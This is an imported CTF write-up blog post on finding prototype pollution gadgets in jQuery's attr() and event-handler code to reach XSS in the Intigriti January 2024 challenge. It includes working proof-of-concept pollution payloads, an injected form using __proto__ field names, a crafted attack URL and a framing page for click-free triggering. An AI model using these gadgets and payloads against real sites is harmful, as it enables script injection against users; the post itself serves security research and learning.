---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2024-01-26_hunting-for-prototype-pollution-gadgets-in-jquery-intigriti-0124-challenge.md
original_filename: 2024-01-26_hunting-for-prototype-pollution-gadgets-in-jquery-intigriti-0124-challenge.md
title: Hunting for Prototype Pollution gadgets in jQuery (intigriti 0124 challenge)
category: documents
detected_topics:
- xss
- supply-chain
- sso
- command-injection
- automation-abuse
- api-security
tags:
- imported
- documents
- xss
- supply-chain
- sso
- command-injection
- automation-abuse
- api-security
language: en
raw_sha256: f13bfd66954816205c1a6e9b684e5ac99de2ed3b7fbc65f926624a5fdf5b43a2
text_sha256: fb0e3ffaa124475731c82df59f517b9b2e8087dc19ad80536a5c323aec7e430d
ingested_at: '2026-06-28T07:32:30Z'
sensitivity: unknown
redactions_applied: false
---

# Hunting for Prototype Pollution gadgets in jQuery (intigriti 0124 challenge)

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2024-01-26_hunting-for-prototype-pollution-gadgets-in-jquery-intigriti-0124-challenge.md
- Source Type: markdown
- Detected Topics: xss, supply-chain, sso, command-injection, automation-abuse, api-security
- Ingested At: 2026-06-28T07:32:30Z
- Redactions Applied: False
- Raw SHA256: `f13bfd66954816205c1a6e9b684e5ac99de2ed3b7fbc65f926624a5fdf5b43a2`
- Text SHA256: `fb0e3ffaa124475731c82df59f517b9b2e8087dc19ad80536a5c323aec7e430d`


## Content

---
title: "Hunting for Prototype Pollution gadgets in jQuery (intigriti 0124 challenge)"
page_title: "Hunting for Prototype Pollution gadgets in jQuery (intigriti 0124 challenge) - Johan Carlsson"
url: "https://joaxcar.com/blog/2024/01/26/hunting-for-prototype-pollution-gadgets-in-jquery-intigriti-0124-challenge/"
final_url: "https://joaxcar.com/blog/2024/01/26/hunting-for-prototype-pollution-gadgets-in-jquery-intigriti-0124-challenge/"
authors: ["Johan Carlsson (@joaxcar)"]
bugs: ["Prototype pollution", "XSS"]
publication_date: "2024-01-26"
added_date: "2024-02-06"
source: "pentester.land/writeups.json"
original_index: 491
---

# Hunting for Prototype Pollution gadgets in jQuery (intigriti 0124 challenge)

This post summarizes what I learned from spending way too much time on the Intigriti January 2024 [challenge](https://challenge-0124.intigriti.io/) created by [Kevin Mizu](https://twitter.com/kevin_mizu).

The challenge made for a great exercise using prototype pollution as a vector to achieve cross-site scripting. It also allowed me to practice some JavaScript source code review. I will not go into too much detail on solving all parts of the challenge here. If you are interested, there are a handful of great [writeups](https://twitter.com/intigriti/status/1747292757125693764) from other people and also the [official solution](https://mizu.re/post/intigriti-january-2024-xss-challenge) by Kevin. I will focus on the prototype pollution gadget I found in jQuery and managed to use to solve the challenge in an unintended way.

![](https://joaxcar.com/blog/wp-content/uploads/2024/01/Untitled.drawio-1024x409.png)

### Challenge summary

The challenge ran for one week in January 2024, and I spent a considerable amount of time on it. The intended solution was not found by anyone during the timeframe of the challenge, while multiple participants found an unintended solution using the jQuery `attr()` function. Kevin later posted a patched version of the challenge where he removed the usage of the `attr({...})` function. To justify the time spent on the challenge, I personally turned the challenge into an exercise in code review and to learn prototype pollution once and for all.

I will skip the details of the first step of the challenge, where we needed to figure out how to inject some limited HTML and use prototype pollution [bug](https://github.com/axios/axios/pull/6167) in the Axios library by abusing the library method of converting HTML forms into JSON data to be used in a request. This part was “easy” and I spent the majority of the time hunting for gadgets in jQuery and trying to understand how to abuse a prototype pollution.

### The anatomy of a Prototype Pollution vulnerability

Before we dive into the source code review of the jQuery library, it might be good to give a short introduction to what we are after. It will be brief, and I recommend anyone who wants to get deeper into the specifics of Prototype Pollution to check out the link section below.

A Prototype Pollution attack consists of two main parts. First, we have the actual prototype pollution vulnerability (in this challenge present in the Axios library). Then, we have the prototype pollution gadget (some JavaScript functionality that allows us to abuse prototype pollution to gain cross-site scripting). The first part is responsible for “polluting” JavaScript objects by altering properties on any shared prototype `Object`. The second part consists of finding places in the target application where property access traverses into any object’s `prototype` chain, hitting any of our polluted values. None of these parts are to be considered a vulnerability on their own as they need to exist at the same time to be exploitable.

The two issues are not required to appear in the same script as any scripts in a document will exist inside the same JavaScript context. However, The issues need to follow in this order in the code flow so that the pollution occurs before our gadget is hit.

Issues allowing for prototype pollution will, most of the time, be fixed as a security issue. On the other hand, we have gadgets or sinks; these seem to sometimes get fixed but are more often left in libraries due to them not being vulnerabilities on their own.

### JavaScript object prototype chain

Prototype Pollution as a vulnerability type can be hard to understand without properly understanding the JavaScript prototype inheritance model. In JavaScript, all objects have this hidden slot called `[[Prototype]]`, which will “store” a reference to any parent object. This parent object will, in turn, have its own `[[Prototype]]` that will point to its parent, and so on, until we reach an object with the `null` value in its `[[Prototype]]`. When we try to access a property on an object in JavaScript like `obj.testProperty` the runtime will first look at the current object to see if it can find the property there. If not present, it will walk up the prototype chain and, in order, look for the property until it’s found or we reach the `null` value. If the property is not found, `undefined` is returned. All objects will, as default, have a shared `Object` prototype as the last object in the chain. It is, however, possible to create objects with your own chosen prototype, and even without a prototype by adding `null` in its place, try `Object.create(null)`.

### Prior work

As it turns out, there is some phenomenal work done in the past on the subject of prototype pollution (who could have guessed :)) and for jQuery gadgets, in particular, I found this blog post from [s1r1us](https://twitter.com/S1r1u5_) invaluable https://blog.s1r1us.ninja/research/PP. There is also an accompanying repository with pollution issues and gadgets here https://github.com/BlackFan/client-side-prototype-pollution.

In the repository above, the researchers use a POC syntax that I will apply in my post. The structure looks like this
  
  
  // First declare the pollution
  Object.prototype.whatToPollute = "pollution value";
  
  // Then call the gadget
  callScriptGadget();
  

In these POCs, the actual pollution vulnerability is presumed to exist already and just mimicked using `Object.prototype` assignments.

### First unintended solution

During the timeframe of the Intigriti challenge, there were some 30+ valid submissions, all using alterations of the same unintended solution. This unintended solution took advantage of a pollution sink not documented in any public resource I could find.

When the challenge page tries to add multiple attributes to a hidden `iframe` element, the jQuery `.attr({...})` function is used. When `attr` is given an object instead of a name/value pair, this code will run
  
  
  // Sets many values
  
  if (toType(key) === "object") {
  chainable = true;
  for (i in key) {
  access(elems, fn, i, key[i], true, emptyGet, raw);
  }
  }
  

The `for ... in` loop is meant to loop through the supplied object, adding all keys as attributes on the target HTML element. In the challenge, the object looks like this
  
  
  {
  "src": repo.homepage,
  "hidden": false
  }
  

The intended outcome is to add `src` and `hidden` attributes to the element. However, it turns out that the `for ... in` loop is not “safe” when it comes to prototype pollution. [MDN](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/for...in) explains that

> The **`for...in`** statement iterates over all [enumerable string properties](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Enumerability_and_ownership_of_properties) of an object (ignoring properties keyed by [symbols](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Symbol)), including inherited enumerable properties.

The last part is important, “including inherited enumerable properties.” Let’s look at MDN again for [enumerable properties](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Enumerability_and_ownership_of_properties)

> _Enumerable properties_ are those properties whose internal enumerable flag is set to true, which is the default for properties created via simple assignment or via a property initializer.

MDN also provides a table that outlines which methods of traversing that take what paths through an object

![](https://joaxcar.com/blog/wp-content/uploads/2024/01/Screenshot-2024-01-25-at-16.34.03.png)

Look how `for ... in` is the only “traversal” that will actually go into its inherited properties to look for more keys to enumerate. A (when it comes to prototype pollution) dangerous pattern that is present in multiple places in jQuery can be shown succinctly like this
  
  
  Object.prototype.test = "polluted";
  const obj = {};
  for (x in obj) {
  console.log(x, obj[x]);
  } // logs: test polluted
  

For jQuery it means that usage of `$("#target").attr({})` has a prototype pollution sink that looks like this
  
  
  Object.prototype.onload = "alert(1)";
  Object.prototype.onfocus = "alert(2)";
  Object.prototype.onclick = "alert(3)";
  // And so on, depending on what event makes sense for the target element.
  $("#target").attr({});
  

In the context of this challenge, it was enough to add an `onload` attribute to the `iframe` to make it pop an alert.

### Digging deeper: What is a “sink” in jQuery

There are some native sinks in JavaScript that we usually look for when we want to escalate prototype pollution to an XSS. For example `innerHTML`, `iframe.srcdoc`, `iframe.src` and `createElement`, but the full list of dangerous calls are much longer. Hitting one of these sinks is the ultimate goal when looking for a gadget.

I spent a lot of time stepping through the jQuery code base, starting from the few sources at our disposal in the challenge. The challenge code contained

  * jQuery initialization `$(...)`
  * Adding attributes using `$(...).attr()`
  * Adding an even listener using `$(...).submit()`

Which all led down pretty deep nested function calls. Stepping through the code from these sources was quite tedious as each opportunity to alter code flow using our pollution would open up new paths to step through, without knowing if there even was any sink to find in the end.

After some time, I decided to take another approach. When learning about security code review, there is always a distinction between top-down (source-to-sink) and bottom-up (sink-to-source) approaches. So far, my top-down approach has not yielded any interesting results. It was time to test the bottom-up approach.

Let’s take a quick look at how jQuery works. Every time you see this in a codebase `$("selector")` or `jQuery("selector")` (`$` is just an alias of `jQuery`), this `init` function is triggered
  
  
  init = jQuery.fn.init = function( selector, context, root ) {...}
  

This `init` function is responsible for handling all the different `selectors` that can be used in `jQuery`. The first thing that is checked is if the selector is a string representation of a `HTML` snippet
  
  
  // Handle HTML strings
  if ( typeof selector === "string" ) {
  if ( selector[ 0 ] === "<" &&
  selector[ selector.length - 1 ] === ">" &&
  selector.length >= 3 ) {
  
  // Assume that strings that start and end with <> are HTML and skip the regex check
  match = [ null, selector, null ];
  
  } else {
  match = rquickExpr.exec( selector );
  }
  ...
  
  

If the string contains `HTML`, then `jQuery` will parse this string into an array of HTML elements. Internally, that is done using `jQuery.parseHTML` like this
  
  
  jQuery.parseHTML(
  match[1],
  context && context.nodeType ? context.ownerDocument || context : document,
  true
  );
  

Which eventually will end up in an `innerHTML` assignment
  
  
  tmp.innerHTML = wrap[1] + jQuery.htmlPrefilter(elem) + wrap[2];
  

inside the function `buildFragment`. This looks like a sink.

We can see that `jQuery` passes in `document` as the `context` in the code block above. This leads `jQuery` to create the `tmp` node using the current page `document` as the rendering document. Thus, a selector like this `<img src=x onerror=alert()>` will render in the context of the current `document` and trigger javascript execution.

With this information, we now have a jQuery-specific sink to look for. If we can control the `selector` to any internal call to `jQuery()`, we will have our sought-after XSS. Searching the source for `jQuery` calls will yield some interesting results. One of them is inside the function `off()`
  
  
  jQuery(types.delegateTarget).off(
  handleObj.namespace
  ? handleObj.origType + "." + handleObj.namespace
  : handleObj.origType,
  handleObj.selector,
  handleObj.handler
  );
  

This particular sink is used in one of the gadgets that exist in the repo mentioned earlier. The full exploit looks like this
  
  
  Object.prototype.preventDefault = "x";
  Object.prototype.handleObj = "x";
  Object.prototype.delegateTarget = "<img/src/onerror=alert(1)>";
  
  $(document).off("foobar");
  

There is also this one inside `select()`
  
  
  value = jQuery(option).val();
  

where we could potentially control the `option` value. Unfortunately, in this challenge, the `select()` statement was not used, so I decided not to dig too deep into this one.

Then we have this one in the function `handlers()`
  
  
  sel = handleObj.selector + " ";
  
  if (matchedSelectors[sel] === undefined) {
  matchedSelectors[sel] = handleObj.needsContext
  ? jQuery(sel, this).index(cur) > -1
  : jQuery.find(sel, this, null, [cur]).length;
  }
  

which shows all the signs of a useful pollution gadget. If we end up here while `handleObj` does not contain a `selector`, we could potentially pollute that value and have the `jQuery` execute our string.

Now, let’s move backward. Can we end up here using any of the sources from the challenge? The function `handlers()` is only called in one place in the codebase, inside the function `dispatch()`
  
  
  handlerQueue = jQuery.event.handlers.call(this, event, handlers);
  

In turn, `dispatch()` is also only called in one place, inside the “event helper” function `add()`
  
  
  if (!(eventHandle = elemData.handle)) {
  eventHandle = elemData.handle = function (e) {
  // Discard the second event of a jQuery.event.trigger() and
  // when an event is called after a page has unloaded
  return typeof jQuery !== "undefined" && jQuery.event.triggered !== e.type
  ? jQuery.event.dispatch.apply(elem, arguments)
  : undefined;
  };
  }
  

It turns out that `add()` is used in the function `on()`, which in turn is used to add event listeners like so `$("#id").on("click," fn).` This is the “new way” of adding event listeners in JQuery. Furthermore, the same function is used to add listeners using the older deprecated methods like `submit()`, which is present on the challenge page
  
  
  $("#search").submit((e) => {
  e.preventDefault();
  search();
  });
  

This means that we have a potential connection between a source and our new sink. Let’s look closer into the `add()` function (I have removed some uninteresting parts)
  
  
  add: function( elem, types, handler, data, selector ) {
  var handleObjIn, eventHandle, tmp,
  events, t, handleObj,
  special, handlers, type, namespaces, origType,
  elemData = dataPriv.get( elem );
  
  ...
  
  // Caller can pass in an object of custom data in lieu of the handler
  if ( handler.handler ) {
  handleObjIn = handler;
  handler = handleObjIn.handler;
  selector = handleObjIn.selector;
  }
  
  // Ensure that invalid selectors throw exceptions at attach time
  // Evaluate against documentElement in case elem is a non-element node (e.g., document)
  if ( selector ) {
  jQuery.find.matchesSelector( documentElement, selector );
  }
  
  ...
  
  // Init the element's event structure and main handler, if this is the first
  if ( !( events = elemData.events ) ) {
  events = elemData.events = Object.create( null );
  }
  
  if ( !( eventHandle = elemData.handle ) ) {
  eventHandle = elemData.handle = function( e ) {
  
  // Discard the second event of a jQuery.event.trigger() and
  // when an event is called after a page has unloaded
  return typeof jQuery !== "undefined" && jQuery.event.triggered !== e.type ?
  jQuery.event.dispatch.apply( elem, arguments ) : undefined;
  };
  }
  
  ...
  
  // If selector defined, determine special event api type, otherwise given type
  type = ( selector ? special.delegateType : special.bindType ) || type;
  
  // handleObj is passed to all event handlers
  handleObj = jQuery.extend( {
  type: type,
  origType: origType,
  data: data,
  handler: handler,
  guid: handler.guid,
  selector: selector,
  needsContext: selector && jQuery.expr.match.needsContext.test( selector ),
  namespace: namespaces.join( "." )
  }, handleObjIn );
  
  ...
  
  // Init the event handler queue if we're the first
  if ( !( handlers = events[ type ] ) ) {
  handlers = events[ type ] = [];
  handlers.delegateCount = 0;
  // Only use addEventListener if the special events handler returns false
  if ( !special.setup ||
  special.setup.call( elem, data, namespaces, eventHandle ) === false ) {
  if ( elem.addEventListener ) {
  elem.addEventListener( type, eventHandle );
  }
  }
  }
  
  ...
  
  // Add to the element's handler list, delegates in front
  if ( selector ) {
  handlers.splice( handlers.delegateCount++, 0, handleObj );
  } else {
  handlers.push( handleObj );
  }
  },
  

There are quite a few things in this function that are of interest, but let’s first look at our main objective, which is to control the handler object. We can see a `handleObj` that will push new event handlers to be used when events trigger on the page. This structure contains what we are interested in, the `selector` value we noticed in `handlers()
  
  
  // handleObj is passed to all event handlers
  handleObj = jQuery.extend( {
  type: type,
  ...
  selector: selector,
  ...
  }, handleObjIn );
  

The `type` defines what type of events this handler will be used for. This will be interesting for us as we would like our potential payload to trigger on other events than the `submit` even that the code tries to configure.

The `add` function is, in this case, called without a special `handler` and thus, this part is free for us to pollute
  
  
  if (handler.handler) {
  handleObjIn = handler;
  handler = handleObjIn.handler;
  selector = handleObjIn.selector;
  }
  

We are thus in full control of the value of the `selector` variable. Remembering the target sink, we could get XSS if the handlers `selector` is empty, as we could then directly pollute it inside the `handlers` function. There are, however, some caveats in the `add()` function. If we try to keep the `selector` here as `undefined` we will not hit this part of the code
  
  
  // Add to the element's handler list, delegates in front
  if ( selector ) {
  handlers.splice( handlers.delegateCount++, 0, handleObj );
  } else {
  

And looking at the `handlers()` function, we need `delegateCount` to exist (and be greater than 0) to get access to the sink. We could try to pollute `delegateCount` (it is possible), but as we have to get the event handler added to the target element, we also need to enter into this code block
  
  
  // Init the event handler queue if we're the first
  if (!(handlers = events[type])) {
  handlers = events[type] = [];
  handlers.delegateCount = 0;
  // Only use addEventListener if the special events handler returns false
  if (
  !special.setup ||
  special.setup.call(elem, data, namespaces, eventHandle) === false
  ) {
  if (elem.addEventListener) {
  elem.addEventListener(type, eventHandle);
  }
  }
  }
  

Where we can see that the native `addEventListener` is called, this code block will, however, set the `delegateCount` to an explicit value and thus block any pollution of the value. For this reason, we can not keep `selector` as `undefined` as initially planned. We are, however, in full control of it and could just add our payload `<img/src/onerror=alert()>`, right? Well, there is a blocker in place for this already. Looking at the `add()` code again, you will see this check
  
  
  // Ensure that invalid selectors throw exceptions at attach time
  if (selector) {
  jQuery.find.matchesSelector(documentElement, selector);
  }
  

The `matchesSelector` will try to use the given `selector` as a CSS selector in the context of the current page. If the passed value is not parsable as a CSS selector, the function throws an error (which is what is intended as of the comment). The code is not checking the result from the call, it just relies on a side effect of the function where an error will stop the code evaluation from progressing. I spent some time trying to bypass the parsing logic of CSS selectors used inside the `matchesSelector` function. I did not find a way to do it, even if it might be possible. During my attempts, any string resembling HTML will throw the error. I was quite close to giving up at this point when I suddenly had an epiphany. What would happen if I passed an array or object to the `matchesSelector`? As it turns out, the function uses another function called `find()` under the hood, and this function starts off by returning early if the selector is not a string
  
  
  if ( typeof selector !== "string" || ... ) {
  return results;
  }
  

`results` here will be an empty array and thus the `matchesSelector` will return `false`, and most importantly it will not error out.

#### The string of an array

We can now pollute the `selector` with an array like this `["<img/src/onerror=alert()>"]`. But this is not enough on its own, as `jQuery(["<img/src/onerror=alert()>"])` will return a jQuery-object version of the array without rendering the content. Luckily for us, a small code quirk is available in our sink. Going back to where the `selector` value is used inside `handlers()` we see this
  
  
  // Don't conflict with Object.prototype properties (trac-13203)
  sel = handleObj.selector + " ";
  

This is a safety measure used by the developers of jQuery to make sure that a given selector will not collide with any properties in the prototype chain. It’s not a guard against Prototype Pollution but rather a guard to not clobber shared properties on object prototypes. For us, this is a savior as `+` used on any value and a string will in JavaScript convert all parts of the expression to strings and then concatenate them. If we were to put an object in the `selector` this would get turned into a string like this `"[object Object] "` as the `toString` value of an object always returns `[object Object]`. But how does JavaScript turn arrays into strings? MDN explains it [here](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/toString)

> The [`Array`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array) object overrides the `toString` method of [`Object`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object). The `toString` method of arrays calls [`join()`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/join) internally, which joins the array and returns one string containing each array element separated by commas. If the `join` method is unavailable or is not a function, [`Object.prototype.toString`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/toString) is used instead, returning `[object Array]`.

How convenient. Turning the array `["<img/src/onerror=alert()>"]` into a string will return `"<img/src/onerror=alert()>"`. Concatenating the array with a string like in `handlers()` will thus make `sel` have the value `"<img/src/onerror=alert()> "` which will then be used in
  
  
  if (matchedSelectors[sel] === undefined) {
  matchedSelectors[sel] = handleObj.needsContext
  ? jQuery(sel, this).index(cur) > -1
  : jQuery.find(sel, this, null, [cur]).length;
  }
  

To hit the correct line `jQuery( sel, this )`, we just need a final pollution of `needsContext`. As long as we give `needsContext` any value the check should pass and we should reach the sink

### The payload

Let’s summarise. By polluting `handler`, `selector`, `delegateType` and `needsContext` we can reach our target sink starting from our source `.submit()`! Polluting `delegateType` will allow us to force the payload to trigger at a more convenient time than on the submit event. To be honest this particular payload in this context will not trigger XSS on `submit`. This has to do with the line
  
  
  cur = event.target;
  ...
  for ( ; cur !== this; cur = cur.parentNode || this ){...}
  

The handler will only trigger if the event target differs from the element where the event handler is mounted. The challenge page will mount the event handler on the form element, and to have the payload trigger we need to have the event target not be the form element itself but a child element. This can be achieved by adding a `focus` or `focusout` on an `input` element inside the `search` form like this
  
  
  <form id="search">
  <input id="x" />
  </form>
  

In the challenge, this was not a problem as this is the structure of our injected form anyways.

What we now end up with is this pollution that will work on both the old and new way of adding event listeners in jQuery (given the parent/child relationship is present in the DOM)
  
  
  Object.prototype.handler = [];
  Object.prototype.selector = ["<img/src/onerror=alert(1)>"];
  Object.prototype.delegateType = "focus";
  Object.prototype.needsContext = "a";
  
  $("#search").submit(() => {});
  $("#search").on("submit", () => {});
  

### Challenge solution

Now, let’s get back to the actual challenge to wrap things up. This is what we need to inject into the challenge page to get the correct pollution
  
  
  <form id="search">
  <input name="__proto__.needsContext" value="x" id="y" />
  <input
  name="__proto__.selector[]"
  value="<img/src/onerror=alert(document.domain)>"
  />
  <input name="__proto__.handler[]" value="" />
  <input name="__proto__.delegateType" value="focus" />
  <input name="__proto__.owner" value="x" />
  </form>
  

We use the input names to pollute with the correct values (this is the Axios bug) and we also add an `id` to one of the input elements to be able to target it with a fragment selector. We can now craft a malicious link that will auto-select the input element `id=y`. However, the pollution, injection, and mounting of the gadget do not line up correctly, and the victim must click the input field manually. A slightly better version uses `focusout` as the trigger event which means that the victim only has to click anywhere on the page to trigger the payload, test this on [https://challenge-0124.intigriti.io/challenge?name=…](https://challenge-0124.intigriti.io/challenge?name=%3Cform%20id=%22search%22%3E%3Cinput%20id=%22y%22%20name=%22__proto__.needsContext%22%20value=%22x%22%3E%20%3Cinput%20name=%22__proto__.selector%5B%5D%22%20value=%22%3Cimg%20src/onerror=alert\(document.domain\)%3E%22%3E%20%3Cinput%20name=%22__proto__.handler%5B%5D%22%20value=%22%22%3E%20%3Cinput%20name=%22__proto__.delegateType%22%20value=%22focusout%22%3E%20%3Cinput%20name=%22__proto__.owner%22%20value=%22x%22%3E%20%3C/form%3E&search=q#y) and click anywhere.

As always, in these challenge scenarios, we want to achieve “0-click XSS”. To work around the click requirement, I used the fact that this challenge page is frameable and built a POC site like this
  
  
  <input id="x" />
  <iframe
  onload=""
  id="target"
  src="https://challenge-0124.intigriti.io/challenge?name=%3Cform%20id=%22search%22%3E%3Cinput%20id=%22y%22%20name=%22__proto__.needsContext%22%20value=%22x%22%3E%20%3Cinput%20name=%22__proto__.selector[]%22%20value=%22%3Cimg%20src/onerror=alert(document.domain)%3E%22%3E%20%3Cinput%20name=%22__proto__.handler[]%22%20value=%22%22%3E%20%3Cinput%20name=%22__proto__.delegateType%22%20value=%22focusout%22%3E%20%3Cinput%20name=%22__proto__.owner%22%20value=%22x%22%3E%20%3C/form%3E&search=q"
  ></iframe>
  
  <script>
  setTimeout(() => {
  target.src = target.src + "#y";
  }, 500);
  setTimeout(() => {
  location = location + "#x";
  }, 1500);
  </script>
  

The attack works by first loading the challenge page in an `iframe` without the fragment selector. After half a second (enough to load the page), the parent page adds the fragment selector to the `iframe` src URL. This will put the browser focus on the `input` tag inside the challenge page. After an additional second (the timing here is just to make it work in all browsers as some of them are slower than others), we change the fragment selector of the POC page to shift the focus to the `input` field in the parent page. This will trigger the `focusout` event inside the `iframe` and pop the alert box.

### Summary

I spent a lot of time on this challenge, and as it turned out, this was not the intended solution but a (what I believe) new pollution vector in the jQuery library. It’s always hard with challenges like these to know if the time put into it will feel worth it in the end. As a bug bounty hunter, this is time that I could have spent looking for bugs that would earn me a bounty. When having doubts like this, I try to remind myself that the bounty part of this hobby is not the main goal. I am primarily doing this to learn about security and have fun, and as long as I feel like the task at hand is a learning opportunity it will be worth it. Going through the hurdle to end up with this POC forced me to finally learn the inner workings of Prototype Pollution. It also gave me an excellent opportunity to practice some hands-on code review and experience the value of thinking in terms of sources and sinks.

As for jQuery pollution gadgets, we can now add these to the list of previous research
  
  
  $("#target").on("event", fn)
  $("#target").attr({})
  

Thanks Kevin and Intigriti for a great learning experience!

### Some links

  * [Official solution by Kevin Mizu](https://mizu.re/post/intigriti-january-2024-xss-challenge)
  * [Blog post by s1r1us](https://blog.s1r1us.ninja/research/PP)
  * [BlackFan repo with PP issues and gadgets](https://github.com/BlackFan/client-side-prototype-pollution)
  * [Basics of PP (french)](https://www.youtube.com/watch?v=vZlP4I7yhI4&ab_channel=AssoHZV)
  * [PP RCE gadgets, Mikhail Shcherbakov](https://www.youtube.com/watch?v=v5dq80S1WF4&ab_channel=BlackHat)
  * [Use DOM invader to find PP](https://www.youtube.com/watch?v=xQ8poeX1_dI&ab_channel=PortSwigger)
  * [PP RCE, Shcherbakov, Balliu](https://www.youtube.com/watch?v=gCVTbfDecwI&ab_channel=DEFCONConference)
  * [Server side PP, Gareth Heyes](https://www.youtube.com/watch?v=LD-KcuKM_0M&ab_channel=nullcon)
  * [Serverside PP BitK & SakiiR (french)](https://www.youtube.com/watch?v=mwpH9DF_RDA&ab_channel=AssoHZV)
  * [Blog about different prototypes in JS](https://alanastorm.com/tracing-javascripts-prototype-chain/)

* * *

Posted 

January 26, 2024

in 

[Writeups](https://joaxcar.com/blog/category/writeups/)

by 

Johan Carlsson

Tags:
